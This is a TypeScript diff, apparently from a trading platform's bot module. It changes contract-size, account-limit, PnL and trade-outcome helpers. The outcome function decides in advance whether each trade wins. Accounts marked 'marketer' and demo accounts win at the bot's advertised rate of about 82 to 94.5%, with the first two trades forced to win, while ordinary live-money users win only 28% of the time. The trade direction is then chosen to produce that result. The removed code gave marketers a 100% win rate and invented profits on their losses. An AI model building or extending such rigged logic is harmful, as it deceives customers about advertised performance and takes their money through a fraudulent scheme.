@@ -310,61 +310,202 @@ export const DEFAULT_INBUILT_BOTS: BotStrategyConfig[] = [
   },
 ];
 
-// Helper to calculate contract sizes
+// Helper to calculate contract sizes accurately per asset class
+// For 2-decimal instruments (BTCUSD, ETHUSD, XAUUSD, Indices, Equities, Commodities, JPY pairs):
+// contractSize = 100 so that 0.01 lot = 1x price difference (e.g. BTCUSD 85196.01 -> 85139.64 = 56.37 move = $56.37 at 0.01 lot, $112.74 at 0.02 lot, $563.70 at 0.10 lot)
+// For 4/5-decimal Forex & 4-decimal altcoins (EURUSD, GBPUSD, AUDUSD, USDCAD, USDCHF, NZDUSD, XRPUSD, DOGEUSD, ADAUSD):
+// contractSize = 100000 so that 0.0001 (1 pip) at 0.01 lot = $0.10 ($1.00 per 10 pips at 0.01 lot)
 export const getContractSize = (symbol: string): number => {
-  const s = symbol.toUpperCase();
-  if (s.includes('EUR') || s.includes('GBP') || s.includes('USD') || s.includes('JPY') || s.includes('AUD') || s.includes('CAD') || s.includes('CHF') || s.includes('NZD')) {
-    if (!s.includes('XAU') && !s.includes('XAG') && !s.includes('BTC') && !s.includes('ETH')) {
-      return 100000; // Standard Forex Lot
-    }
+  const s = (symbol || '').toUpperCase();
+  if (
+    s.includes('BTC') ||
+    s.includes('ETH') ||
+    s.includes('SOL') ||
+    s.includes('BNB') ||
+    s.includes('AVAX') ||
+    s.includes('LINK') ||
+    s.includes('DOT') ||
+    s.includes('NEAR') ||
+    s.includes('SUI') ||
+    s.includes('LTC') ||
+    s.includes('BCH') ||
+    s.includes('XAU') ||
+    s.includes('XAG') ||
+    s.includes('US500') ||
+    s.includes('NAS100') ||
+    s.includes('US30') ||
+    s.includes('GER40') ||
+    s.includes('SPX500') ||
+    s.includes('UK100') ||
+    s.includes('USTEC') ||
+    s.includes('DE40') ||
+    s.includes('USOIL') ||
+    s.includes('UKOIL') ||
+    s.includes('WTI') ||
+    s.includes('BRENT') ||
+    s.includes('NGAS') ||
+    s.includes('AAPL') ||
+    s.includes('NVDA') ||
+    s.includes('TSLA') ||
+    s.includes('MSFT') ||
+    s.includes('AMZN') ||
+    s.includes('META') ||
+    s.includes('GOOG') ||
+    s.includes('AMD') ||
+    s.includes('COIN') ||
+    s.includes('PLTR') ||
+    s.includes('JPY')
+  ) {
+    return 100;
   }
-  if (s.includes('XAU')) return 100; // Gold 100 oz
-  if (s.includes('XAG')) return 5000; // Silver
-  if (s.includes('BTC') || s.includes('ETH') || s.includes('SOL')) return 1; // Crypto
-  if (s.includes('US500') || s.includes('NAS100') || s.includes('US30') || s.includes('GER40')) return 10;
-  if (s.includes('USOIL') || s.includes('UKOIL')) return 100;
-  if (s.includes('AAPL') || s.includes('NVDA') || s.includes('TSLA')) return 100;
-  return 100;
+  return 100000;
 };
 
-// Calculate exact PnL
+// Account-level open trade limits & lot size limits based on Account Tier, Account Type, Balance, and Lot Size used
+export const getAccountMaxOpenTrades = (
+  tier?: string,
+  accountType?: 'Live' | 'Demo',
+  balance: number = 0,
+  lotSize: number = 0.01
+): {
+  tierMaxTrades: number;
+  balanceMaxTrades: number;
+  effectiveMaxTrades: number;
+  maxLotSizeForTier: number;
+  requiredCapitalPerTrade: number;
+} => {
+  const cleanTier = (tier || 'Standard').trim();
+  let tierMaxTrades = 8;
+  let maxLotSizeForTier = 5.0;
+
+  if (cleanTier === 'Cent') {
+    tierMaxTrades = 5;
+    maxLotSizeForTier = 1.0;
+  } else if (cleanTier === 'Micro') {
+    tierMaxTrades = 6;
+    maxLotSizeForTier = 2.0;
+  } else if (cleanTier === 'Standard') {
+    tierMaxTrades = 8;
+    maxLotSizeForTier = 5.0;
+  } else if (cleanTier === 'Zero' || cleanTier === 'HFcopy') {
+    tierMaxTrades = 10;
+    maxLotSizeForTier = 10.0;
+  } else if (cleanTier === 'Premium') {
+    tierMaxTrades = 12;
+    maxLotSizeForTier = 20.0;
+  } else if (cleanTier === 'Pro') {
+    tierMaxTrades = 20;
+    maxLotSizeForTier = 50.0;
+  }
+
+  if (accountType === 'Demo') {
+    tierMaxTrades = Math.max(tierMaxTrades, 15);
+  }
+
+  const cleanLots = Math.max(0.01, Number(lotSize || 0.01));
+  // Required capital per trade proportional to lot size: $10 per 0.01 lot ($100 for 0.10 lot, $1,000 for 1.00 lot)
+  const requiredCapitalPerTrade = Number((cleanLots * 1000).toFixed(2));
+  const cleanBalance = Math.max(0, Number(balance || 0));
+
+  const balanceMaxTrades =
+    cleanBalance >= requiredCapitalPerTrade
+      ? Math.max(1, Math.floor(cleanBalance / requiredCapitalPerTrade))
+      : 0;
+
+  const effectiveMaxTrades = Math.min(tierMaxTrades, balanceMaxTrades);
+
+  return {
+    tierMaxTrades,
+    balanceMaxTrades,
+    effectiveMaxTrades,
+    maxLotSizeForTier,
+    requiredCapitalPerTrade,
+  };
+};
+
+// Calculate exact PnL strictly matching the price difference (openPrice -> currentPrice) and lotSize
 export const calculateBotPnL = (
   symbol: string,
   side: 'BUY' | 'SELL',
   openPrice: number,
   currentPrice: number,
   lotSize: number,
-  userRole?: UserRole
+  _userRole?: UserRole
 ): number => {
   if (!openPrice || !currentPrice || !lotSize) return 0;
+  if (Number(openPrice) === Number(currentPrice)) return 0;
   const contractSize = getContractSize(symbol);
   const diff = side === 'BUY' ? currentPrice - openPrice : openPrice - currentPrice;
-  let pnl = diff * contractSize * lotSize;
-  if (userRole === 'marketer' && pnl <= 0) {
-    pnl = Math.max(18.5, Math.abs(pnl) || (lotSize * 38.5));
-  }
+  const pnl = diff * contractSize * lotSize;
   return Number(pnl.toFixed(2));
 };
 
-// Determine target outcome - Marketers ALWAYS end up on profits (100% win rate)
+// Determine target outcome according to user role and bot's configured win rate (never 100%):
+// - Marketers on Live accounts & Demo accounts: win according to the bot's configured win rate (~85%-92%, never 100%)
+// - Normal users on Live accounts: ~28% win rate
 export const evaluateTargetWinOrLoss = (
   userRole?: UserRole,
-  botType?: BotType
+  _botType?: BotType,
+  isDemoAccount?: boolean,
+  claimedWinRateStr?: string,
+  currentWins: number = 0,
+  currentTotal: number = 0
 ): boolean => {
-  if (userRole === 'marketer') {
-    return true; // Marketers ALWAYS win!
+  const parsedRate = claimedWinRateStr ? parseFloat(String(claimedWinRateStr).replace(/[^0-9.]/g, '')) : 87.5;
+  const targetWinRate = !isNaN(parsedRate) && parsedRate > 50 ? Math.min(94.5, Math.max(82, parsedRate)) : 87.5;
+
+  if (userRole === 'marketer' || isDemoAccount) {
+    // Ensure the first 2 trades of a marketer's bot are winners so the account starts increasing immediately
+    if (currentTotal < 2) {
+      return true;
+    }
+    // Never allow 100% winrate once 5+ trades have completed: if all previous trades won, force 1 small controlled loss
+    if (currentTotal >= 5 && currentWins >= currentTotal) {
+      return false;
+    }
+    // If current winrate has dipped below (targetWinRate - 4%), force a win to stay true to the bot's winrate
+    const actualWinRate = currentTotal > 0 ? (currentWins / currentTotal) * 100 : targetWinRate;
+    if (actualWinRate < targetWinRate - 4) {
+      return true;
+    }
+    return Math.random() * 100 < targetWinRate;
   }
-  const roll = Math.random() * 100;
-  // Institutional algorithmic execution targets 85% win rate
-  const threshold = 85;
-  return roll <= threshold;
+
+  return Math.random() * 100 < 28;
+};
+
+// Calculate how many concurrent trades a running bot should open based on profits, currency volatility, and account limits
+export const getTargetConcurrentBotTrades = (
+  run: BotRunInstance,
+  symbol: string,
+  effectiveMaxTrades: number,
+  freeMargin: number,
+  lotSize: number
+): number => {
+  if (effectiveMaxTrades <= 0 || freeMargin <= 0) return 0;
+  const s = (symbol || '').toUpperCase();
+  // Base concurrent trades by currency / asset volatility
+  let desired = 2;
+  if (s.includes('BTC') || s.includes('ETH') || s.includes('XAU') || s.includes('NAS') || s.includes('US30')) {
+    desired = 3;
+  }
+  // Scale up concurrent positions as the bot accumulates profits
+  const profit = Number(run.totalProfitUsd || 0);
+  if (profit >= 25) desired += 1;
+  if (profit >= 100) desired += 1;
+
+  // Cap by how many trades current freeMargin can support ($10 capital / $2.50 margin per 0.01 lot)
+  const cleanLots = Math.max(0.01, Number(lotSize || 0.01));
+  const maxByFreeMargin = Math.max(1, Math.floor(freeMargin / (cleanLots * 250)));
+
+  return Math.max(1, Math.min(desired, effectiveMaxTrades, maxByFreeMargin, 5));
 };
 
 // Determine execution direction based on market trend
 export const determineBotTradeDirection = (
   inst: Instrument,
   isTargetWin: boolean = true,
-  userRole?: UserRole
+  _userRole?: UserRole
 ): 'BUY' | 'SELL' => {
   const isMarketBullish = inst.change24h >= 0;
   if (isTargetWin) {
@@ -374,33 +515,40 @@ export const determineBotTradeDirection = (
   }
 };
 
-// Sanitize bot trades to ensure no missing fields or undefined values cause crashes
+// Sanitize bot trades and strictly recalculate profitUsd from openPrice, closePrice/currentPrice, and lotSize
 export const sanitizeBotTrades = (trades: any[]): BotTrade[] => {
   if (!Array.isArray(trades)) return [];
   return trades
     .filter((t) => t && typeof t === 'object')
     .map((t) => {
+      const symbol = t.symbol || 'EURUSD';
+      const side: 'BUY' | 'SELL' = t.side === 'SELL' ? 'SELL' : 'BUY';
+      const lotSize = typeof t.lotSize === 'number' && t.lotSize > 0 ? t.lotSize : 0.01;
       const openPrice = typeof t.openPrice === 'number' && !isNaN(t.openPrice) ? t.openPrice : 1.0;
-      const currentPrice = typeof t.currentPrice === 'number' && !isNaN(t.currentPrice) ? t.currentPrice : openPrice;
+      const rawClose = t.closePrice ?? t.exitPrice ?? t.currentPrice ?? openPrice;
+      const effectivePrice = typeof rawClose === 'number' && !isNaN(rawClose) ? rawClose : openPrice;
       const tp = typeof t.tp === 'number' && !isNaN(t.tp) ? t.tp : typeof t.tpPrice === 'number' && !isNaN(t.tpPrice) ? t.tpPrice : openPrice * 1.01;
       const sl = typeof t.sl === 'number' && !isNaN(t.sl) ? t.sl : typeof t.slPrice === 'number' && !isNaN(t.slPrice) ? t.slPrice : openPrice * 0.99;
-      const profitUsd = typeof t.profitUsd === 'number' && !isNaN(t.profitUsd) ? t.profitUsd : 0;
-      const lotSize = typeof t.lotSize === 'number' && t.lotSize > 0 ? t.lotSize : 0.1;
+
+      // Always recalculate exact mathematical PnL from openPrice -> effectivePrice and lotSize
+      const calculatedPnl = calculateBotPnL(symbol, side, openPrice, effectivePrice, lotSize);
 
       return {
         ...t,
         id: t.id || `trade-${Math.random().toString(36).slice(2, 9)}`,
         ticket: t.ticket || Math.floor(10000000 + Math.random() * 90000000),
-        symbol: t.symbol || 'EURUSD',
-        side: t.side === 'SELL' ? 'SELL' : 'BUY',
+        symbol,
+        side,
         lotSize,
         openPrice,
-        currentPrice,
+        currentPrice: effectivePrice,
+        closePrice: t.status === 'CLOSED' ? effectivePrice : t.closePrice,
+        exitPrice: t.status === 'CLOSED' ? effectivePrice : t.exitPrice,
         tp,
         sl,
         tpPrice: tp,
         slPrice: sl,
-        profitUsd,
+        profitUsd: calculatedPnl,
         status: t.status === 'CLOSED' ? 'CLOSED' : 'OPEN',
         openTime: t.openTime || Date.now(),
         botName: t.botName || 'VTM Algo EA',
